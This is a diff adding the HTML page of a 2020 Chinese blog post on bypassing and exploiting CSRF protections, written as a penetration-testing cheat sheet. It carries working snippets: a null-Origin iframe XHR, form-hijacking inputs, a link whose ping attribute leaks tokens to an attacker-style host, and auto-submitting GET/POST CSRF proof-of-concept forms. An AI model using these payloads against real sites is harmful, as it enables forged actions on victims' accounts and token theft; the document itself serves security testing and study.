@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+<title>CSRF的绕过与利用 - Threezh1&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
+
+
+
+
+<meta name="description" content="Share learn & Share life.">
+
+
+
+<meta name="keywords" content="Threezh1">
+
+
+
+    <meta name="description" content="Origin &amp;amp; Referer  BypassNull&amp;#x503C;&amp;#x7ED5;&amp;#x8FC7;&amp;#x5F53;&amp;#x9047;&amp;#x5230;&amp;#x4E00;&amp;#x4E2A;cors&amp;#x53EF;&amp;#x7528;null&amp;#x503C;&amp;#x7ED5;&amp;#x8FC7;&amp;#x65F6;&amp;#xFF0C;&amp;#x7528;iframe&amp;#x914D;&amp;#x5408;data&amp;#x534">
+<meta name="keywords" content="CSRF,渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF的绕过与利用">
+<meta property="og:url" content="http://yoursite.com/2020/02/25/CSRF绕过整理/index.html">
+<meta property="og:site_name" content="Threezh1&#39;s blog">
+<meta property="og:description" content="Origin &amp;amp; Referer  BypassNull&amp;#x503C;&amp;#x7ED5;&amp;#x8FC7;&amp;#x5F53;&amp;#x9047;&amp;#x5230;&amp;#x4E00;&amp;#x4E2A;cors&amp;#x53EF;&amp;#x7528;null&amp;#x503C;&amp;#x7ED5;&amp;#x8FC7;&amp;#x65F6;&amp;#xFF0C;&amp;#x7528;iframe&amp;#x914D;&amp;#x5408;data&amp;#x534">
+<meta property="og:locale" content="Chinese">
+<meta property="og:updated_time" content="2020-02-25T03:00:27.008Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSRF的绕过与利用">
+<meta name="twitter:description" content="Origin &amp;amp; Referer  BypassNull&amp;#x503C;&amp;#x7ED5;&amp;#x8FC7;&amp;#x5F53;&amp;#x9047;&amp;#x5230;&amp;#x4E00;&amp;#x4E2A;cors&amp;#x53EF;&amp;#x7528;null&amp;#x503C;&amp;#x7ED5;&amp;#x8FC7;&amp;#x65F6;&amp;#xFF0C;&amp;#x7528;iframe&amp;#x914D;&amp;#x5408;data&amp;#x534">
+
+
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+</head>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                <img src="/images/logo.png" alt height="28">
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item " href="/archives">归档</a>
+            
+            <a class="navbar-item " href="/Projects">项目</a>
+            
+            <a class="navbar-item " href="/Life">生活</a>
+            
+            <a class="navbar-item " href="/Photography">摄影</a>
+            
+            <a class="navbar-item " href="/about">关于</a>
+            
+            <a class="navbar-item " href="http://119.3.219.188/">Threeday</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Search" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" href="https://github.com/Threezh1">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            CSRF的绕过与利用
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2020-02-25T04:00:00.000Z" itemprop="datePublished">Feb 25 2020</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            4 minutes read (About 571 words)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <h2 id="Origin-amp-Referer-Bypass"><a href="#Origin-amp-Referer-Bypass" class="headerlink" title="Origin &amp; Referer  Bypass"></a>Origin &amp; Referer  Bypass</h2><h3 id="Null&#x503C;&#x7ED5;&#x8FC7;"><a href="#Null&#x503C;&#x7ED5;&#x8FC7;" class="headerlink" title="Null&#x503C;&#x7ED5;&#x8FC7;"></a>Null&#x503C;&#x7ED5;&#x8FC7;</h3><p>&#x5F53;&#x9047;&#x5230;&#x4E00;&#x4E2A;cors&#x53EF;&#x7528;null&#x503C;&#x7ED5;&#x8FC7;&#x65F6;&#xFF0C;&#x7528;iframe&#x914D;&#x5408;data&#x534F;&#x8BAE;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x53D1;&#x9001;&#x4E00;&#x4E2A;origin&#x4E3A;null&#x7684;&#x8BF7;&#x6C42;&#x3002;&#x8FD9;&#x4E2A;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;&#x540C;&#x6837;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x5728;CSRF&#x8FD9;&#x91CC;&#x3002;</p>
+<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">sandbox</span>=<span class="hljs-string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&apos;data:text/html,&lt;script&gt;var req=new XMLHttpRequest();req.onload=reqListener;req.open(&quot;get&quot;,&quot;http://127.0.0.1/test.html&quot;,true);req.withCredentials=true;req.send();function reqListener(){alert(this.responseText)};&lt;/script&gt;&apos;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+<h3 id="&#x57DF;&#x540D;&#x6821;&#x9A8C;&#x7ED5;&#x8FC7;"><a href="#&#x57DF;&#x540D;&#x6821;&#x9A8C;&#x7ED5;&#x8FC7;" class="headerlink" title="&#x57DF;&#x540D;&#x6821;&#x9A8C;&#x7ED5;&#x8FC7;"></a>&#x57DF;&#x540D;&#x6821;&#x9A8C;&#x7ED5;&#x8FC7;</h3><p>&#x5F53;&#x57DF;&#x540D;&#x6821;&#x9A8C;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x4E25;&#x683C;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x51E0;&#x79CD;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF1A;</p>
+<ul>
+<li>&#x5728;&#x540E;&#x9762;&#x52A0;&#x57DF;&#x540D;    qq.com =&gt; qq.com.abc.com    </li>
+<li>&#x5C06;&#x57DF;&#x540D;&#x62FC;&#x63A5;       abc.qq.com =&gt; abc_qq.com</li>
+<li>&#x5728;&#x524D;&#x9762;&#x6216;&#x8005;&#x5728;&#x540E;&#x9762;&#x52A0;&#x5B57;&#x7B26; qq.com =&gt; abcqq.com / qq.com =&gt; qq.comabc.com / qq.com =&gt; abc.com/qq.com</li>
+</ul>
+<h3 id="&#x914D;&#x5408;XSS&#x8FDB;&#x884C;&#x5229;&#x7528;"><a href="#&#x914D;&#x5408;XSS&#x8FDB;&#x884C;&#x5229;&#x7528;" class="headerlink" title="&#x914D;&#x5408;XSS&#x8FDB;&#x884C;&#x5229;&#x7528;"></a>&#x914D;&#x5408;XSS&#x8FDB;&#x884C;&#x5229;&#x7528;</h3><p>&#x5F53;&#x540C;&#x6E90;&#x7F51;&#x7AD9;&#x4E2D;&#x5B58;&#x5728;&#x4E00;&#x4E2A;xss&#x6F0F;&#x6D1E;&#x65F6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;xss&#x5305;&#x542B;CSRF&#x7684;payload&#x8FDB;&#x884C;&#x5229;&#x7528;&#x3002;&#x4E0D;&#x4EC5;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x7B80;&#x5355;&#x7684;Referer&#x548C;Origin&#x9A8C;&#x8BC1;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x52AB;&#x6301;&#x8868;&#x5355;&#x4E0E;URL&#x4E2D;&#x7684;token&#x8FDB;&#x884C;&#x5229;&#x7528;&#x3002;</p>
+<h4 id="&#x83B7;&#x53D6;&#x8868;&#x5355;&#x4E2D;&#x7684;token"><a href="#&#x83B7;&#x53D6;&#x8868;&#x5355;&#x4E2D;&#x7684;token" class="headerlink" title="&#x83B7;&#x53D6;&#x8868;&#x5355;&#x4E2D;&#x7684;token"></a>&#x83B7;&#x53D6;&#x8868;&#x5355;&#x4E2D;&#x7684;token</h4><p>&#x5F53;token&#x5B58;&#x5728;&#x4E8E;&#x8868;&#x5355;&#x4E2D;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x914D;&#x5408;XSS&#x6F0F;&#x6D1E;&#x8FDB;&#x884C;&#x8868;&#x5355;&#x52AB;&#x6301;&#x8FDB;&#x800C;&#x8BA9;token&#x7684;&#x9650;&#x5236;&#x3002;</p>
+<ul>
+<li>xss&#x52AB;&#x6301;&#x9875;&#x9762;&#x4E2D;&#x67D0;&#x4E2A;&#x8868;&#x5355;&#x7684;&#x63D0;&#x4EA4;</li>
+</ul>
+<p>&#x50CF;&#x8FD9;&#x4E2A;&#x5C31;&#x53EF;&#x4EE5;&#x52AB;&#x6301;user-edit&#x8868;&#x5355;&#x7684;&#x63D0;&#x4EA4;&#xFF0C;&#x70B9;&#x51FB;&#x5373;&#x53EF;&#x63D0;&#x4EA4;form&#x8868;&#x5355;&#x3002;</p>
+<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">form</span>=<span class="hljs-string">&quot;user-edit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hijack&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x8FD9;&#x4E2A;&#x5C31;&#x76F8;&#x5F53;&#x4E8E;&#x52AB;&#x6301;&#x4E86;user-edit&#x8868;&#x5355;&#x7136;&#x540E;&#x8FDB;&#x884C;&#x63D0;&#x4EA4;</p>
+<ul>
+<li>xss&#x52AB;&#x6301;&#x9875;&#x9762;&#x8868;&#x5355;&#x5E76;&#x4FEE;&#x6539;value</li>
+</ul>
+<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">form</span>=<span class="hljs-string">&quot;user-edit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;notes&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;This is a test&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">form</span>=<span class="hljs-string">&quot;user-edit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;secert&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;on&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">form</span>=<span class="hljs-string">&quot;user-edit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hijack&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x52AB;&#x6301;user-edit&#x8868;&#x5355;&#xFF0C;&#x8986;&#x76D6;&#x5404;&#x8868;&#x5355;&#x7684;value&#xFF0C;&#x8FDB;&#x884C;CSRF&#x5229;&#x7528;&#x3002;</p>
+<h4 id="&#x83B7;&#x53D6;url&#x53C2;&#x6570;&#x4E2D;&#x7684;token"><a href="#&#x83B7;&#x53D6;url&#x53C2;&#x6570;&#x4E2D;&#x7684;token" class="headerlink" title="&#x83B7;&#x53D6;url&#x53C2;&#x6570;&#x4E2D;&#x7684;token"></a>&#x83B7;&#x53D6;url&#x53C2;&#x6570;&#x4E2D;&#x7684;token</h4><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://evil7.cn&quot;</span>&gt;</span>get_token<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://xz.aliyun.com/&quot;</span> <span class="hljs-attr">ping</span>=<span class="hljs-string">&quot;https://evil7.cn&quot;</span>&gt;</span>ping_leak<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x53C2;&#x8003;&#xFF1A;<a href="https://xz.aliyun.com/t/7084" target="_blank" rel="noopener">&#x9B54;&#x6CD5;&#x624D;&#x80FD;&#x6253;&#x8D25;&#x9B54;&#x6CD5;&#xFF1A;&#x5173;&#x4E8E;&#x83B7;&#x53D6;csrf-token&#x524D;&#x7AEF;&#x6280;&#x5DE7;&#x601D;&#x8003;</a></p>
+<h3 id="&#x914D;&#x5408;URL&#x8DF3;&#x8F6C;&#x6F0F;&#x6D1E;"><a href="#&#x914D;&#x5408;URL&#x8DF3;&#x8F6C;&#x6F0F;&#x6D1E;" class="headerlink" title="&#x914D;&#x5408;URL&#x8DF3;&#x8F6C;&#x6F0F;&#x6D1E;"></a>&#x914D;&#x5408;URL&#x8DF3;&#x8F6C;&#x6F0F;&#x6D1E;</h3><p>&#x5982;&#x679C;&#x662F;GET&#x5F62;&#x5F0F;&#x7684;CSRF&#xFF0C;&#x914D;&#x5408;URL&#x8DF3;&#x8F6C;&#x6F0F;&#x6D1E;&#xFF0C;&#x5373;&#x53EF;Origin&#x548C;Referer&#x7684;&#x9650;&#x5236;&#x3002;</p>
+<h2 id="X-Request-with-Bypass"><a href="#X-Request-with-Bypass" class="headerlink" title="X-Request-with Bypass"></a>X-Request-with Bypass</h2><p>&#x4F7F;&#x7528;swf&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF1A;<a href="https://github.com/Qclover/CSRF" target="_blank" rel="noopener">https://github.com/Qclover/CSRF</a></p>
+<h2 id="Token-Bypass"><a href="#Token-Bypass" class="headerlink" title="Token Bypass"></a>Token Bypass</h2><ul>
+<li>&#x5220;&#x9664;Token&#x53C2;&#x6570;&#x5B57;&#x6BB5;</li>
+<li>&#x5C06;Token&#x53C2;&#x6570;&#x503C;&#x7F6E;&#x7A7A;</li>
+</ul>
+<h2 id="CSRF-POC-&#x6784;&#x9020;"><a href="#CSRF-POC-&#x6784;&#x9020;" class="headerlink" title="CSRF POC &#x6784;&#x9020;"></a>CSRF POC &#x6784;&#x9020;</h2><h3 id="GET-CSRF"><a href="#GET-CSRF" class="headerlink" title="GET - CSRF"></a>GET - CSRF</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http://xxxx.org/csrf.php?xx=11 /&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POST-CSRF"><a href="#POST-CSRF" class="headerlink" title="POST - CSRF"></a>POST - CSRF</h3><p>&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;Brupsuite&#x751F;&#x6210;CSRF POC&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x6784;&#x9020;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=http://aaaaaa.org/csrf.php method=POST&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;xx&quot; value=&quot;11&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="&#x53C2;&#x8003;-amp-&#x5907;&#x4EFD;"><a href="#&#x53C2;&#x8003;-amp-&#x5907;&#x4EFD;" class="headerlink" title="&#x53C2;&#x8003; &amp; &#x5907;&#x4EFD;"></a>&#x53C2;&#x8003; &amp; &#x5907;&#x4EFD;</h2><ul>
+<li><p><a href="https://xz.aliyun.com/t/6414" target="_blank" rel="noopener">&#x4E00;&#x6B21;CSRF&#x6D4B;&#x8BD5;&#x5F15;&#x53D1;&#x7684;&#x601D;&#x8003;</a></p>
+</li>
+<li><p><a href="https://xz.aliyun.com/t/7084" target="_blank" rel="noopener">&#x9B54;&#x6CD5;&#x624D;&#x80FD;&#x6253;&#x8D25;&#x9B54;&#x6CD5;&#xFF1A;&#x5173;&#x4E8E;&#x83B7;&#x53D6;csrf-token&#x524D;&#x7AEF;&#x6280;&#x5DE7;&#x601D;&#x8003;</a></p>
+</li>
+<li><p><a href="https://xz.aliyun.com/t/85" target="_blank" rel="noopener">PhpcmsV9&#x4ECE;&#x53CD;&#x5C04;&#x578B;XSS&#x5230;CSRF&#x7ED5;&#x8FC7;&#x5230;Getshell</a></p>
+</li>
+</ul>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/CSRF/">#CSRF</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/渗透测试/">#渗透测试</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2020/02/19/CORS原理及利用整理/">CORS原理及利用整理</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 Threezh1&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/Threezh1">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
+
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("chinese");
+</script>
+
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {
+        // ...options...
+    });
+});
+</script>
+
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+
+
+<script src="/js/script.js"></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something...">
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js"></script>
+    
+</body>
+</html>
